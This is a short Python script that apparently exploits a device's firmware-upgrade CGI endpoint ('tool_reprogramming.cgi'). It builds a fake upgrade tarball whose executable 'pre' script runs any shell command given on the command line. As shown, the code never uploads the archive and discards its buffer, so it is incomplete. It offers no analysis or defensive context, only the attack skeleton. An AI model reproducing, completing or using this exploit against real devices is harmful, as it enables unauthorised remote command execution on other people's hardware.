import argparse
import io
import tarfile
import urllib.request

parser = argparse.ArgumentParser()
parser.add_argument("--command")
args = parser.parse_args()
lock_meta = "LOCK_NAME=PRODUCT\n"
image = "upgradepkg.tar"
endpoint = "/cgi-bin/tool_reprogramming.cgi"
content_type = "multipart/form-data"

def put_entry(name, body, mode):
    info = tarfile.TarInfo(name)
    info.mode = mode
    info.size = len(body)
    archive.addfile(info, io.BytesIO(body))

with tarfile.open(fileobj=io.BytesIO(), mode="w") as archive:
    put_entry("pre", ("#!/bin/sh\n" + args.command).encode(), 0o755)
    put_entry("lockfile", lock_meta.encode(), 0o644)
